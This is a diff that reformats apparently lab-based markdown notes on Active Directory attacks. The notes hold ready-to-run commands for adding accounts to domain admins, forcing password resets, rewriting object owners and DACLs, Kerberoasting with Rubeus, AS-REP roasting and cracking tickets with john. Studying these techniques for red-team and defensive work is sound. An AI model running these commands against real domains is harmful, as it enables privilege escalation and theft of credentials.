@@ -53,7 +53,6 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 ### On a Computer
 - **Resource-Based Constrained Delegation (RBCD)**
 
-
 ## Special Rights Abuse
 
 1. GenericWrite on User
@@ -85,42 +84,42 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 3. Self-Membership
 
 - **Add to Group**
-    ```powershell
-    Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
-    ```
+```powershell
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+```
 
 4. ExtendedRight on
 - **User-Force-Change-Password (Password Reset)**
-    ```powershell
-    Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
-    Set-DomainUserPassword -Identity delegate -Verbose
-    ```
+```powershell
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+Set-DomainUserPassword -Identity delegate -Verbose
+```
 
 5. WriteProperty
 - **Add to Group**
-    ```powershell
-    Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
-    ```
+```powershell
+Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
+```
 
 6. WriteOwner
 - **Change the object’s owner**
-    ```powershell
-    Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
-    ```
+```powershell
+Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
+```
 - **Check Owner**
-    ```powershell
-    Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
-    ```
+```powershell
+Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
+```
 
 7. WriteDACL
 - **Grant Generic Permissions** (must be the owner)
-    ```powershell
-    $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
-    $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
-    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
-    $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
-    $ADSI.psbase.commitchanges()
-    ```
+```powershell
+$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
+$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
+$ADSI.psbase.commitchanges()
+```
 
 8. DCSync Attack 
 - The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
@@ -135,25 +134,26 @@ Kerberoasting targets accounts with Kerberos service tickets by exploiting servi
 
 ### Find Service Accounts
 - Using Active Directory:
-    ```powershell
-    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-    ```
+```powershell
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
 - Using PowerView:
-    ```powershell
-    Get-DomainUser –SPN
-    ```
+```powershell
+Get-DomainUser –SPN
+```
 
 ### Escalation
 - Use `Rubeus` to Kerberoast service accounts supporting RC4 encryption.
-    ```powershell
-    Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
-    ```
+```powershell
+Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
+```
 
 ### Crack Tickets
 - Use `john` to crack Kerberos tickets:
-    ```bash
-    john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
-    ```
+```bash
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+```
 
 ### Targeted Kerberoasting
 
@@ -171,12 +171,11 @@ Kerberoasting targets accounts with Kerberos service tickets by exploiting servi
 - Kerberoasting
 	- `Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt`
 
-
 ### AS-REP Roasting
 Find accounts without Kerberos preauthentication and request an AS-REP hash for offline cracking:
 ```powershell
-	Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
-	Invoke-ASREPRoast -Verbose
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+Invoke-ASREPRoast -Verbose
 ```
 
 
